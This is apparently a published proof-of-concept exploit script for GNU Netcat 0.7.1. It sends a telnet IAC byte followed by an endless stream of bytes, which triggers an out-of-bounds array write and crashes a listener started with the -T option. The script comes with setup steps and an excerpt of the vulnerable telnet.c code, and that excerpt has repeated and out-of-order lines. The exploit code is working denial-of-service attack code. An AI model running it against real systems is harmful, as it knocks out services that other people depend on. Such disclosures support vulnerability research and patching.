#/usr/bin/python
#-*- Coding: utf-8 -*-

### GNU Netcat 0.7.1 - Out of bounds array write (Access Violation) by n30m1nd ### 

# Date: 2016-11-19
# Exploit Author: n30m1nd
# Vendor Homepage: http://netcat.sourceforge.net/
# Software Link: https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download
# Version: 0.7.1
# Tested on: Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux

# Credits
# =======
# Props to Giovanni and Armando creators of this useful piece of software, thank you guys!
# Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better. See you at AWE!

# How to
# ======
# * Get a distribution that ships with gnu netcat or Compile netcat from sources:
#       * # Download
#       * tar -xzf netcat-0.7.1.tar.gz
#       * cd netcat-0.7.1/
#       * ./configure
#       * make
#       * # Netcat will be deployed in src/netcat
#
# * Set netcat to listen like the following:
#   * ./netcat -nlvp 12347 -T
# * Just run this script on a different terminal
#

# Why?
# ====
# When the Telnet Negotiation is activated (-T option), Netcat parses the incoming packets looking for Telnet Control Codes
# by running them through buggy switch/case code. 
# Aforementioned code fails to safely check for array boundaries resulting in an array out of bounds write.

# Vulnerable code
# ===============
# telnet.c
# ...
# 76   static unsigned char getrq[4];
# 77   static int l = 0;
# 78   unsigned char putrq[4], *buf = ncsock->recvq.pos;
# ...
# 88   /* loop all chars of the string */
# 89   for (i = 0; i < ref_size; i++) {
# 90     /* if we found IAC char OR we are fetching a IAC code string process it */
# 91     if ((buf[i] != TELNET_IAC) && (l == 0))
# ...
#100     getrq[l++] = buf[i]; // BANG!
# 99     /* copy the char in the IAC-code-building buffer */
# ...
# 76   static unsigned char getrq[4];
# 77   static int l = 0;
# 78   unsigned char putrq[4], *buf = ncsock->recvq.pos;

# Exploit code
# ============

import socket

RHOST = "127.0.0.1"
RPORT = 12347

print("[+] Connecting to %s:%d") % (RHOST, RPORT)
s = socket.create_connection((RHOST, RPORT))
s.send("\xFF") # Telnet control character
print("[+] Telnet control character sent")
print("[i] Starting")
try:
	i = 0
	while True: # Loop until it crashes
		i += 1
		s.send("\x30")
except:
	print("[+] GNU Netcat crashed on iteration: %d") % (i)
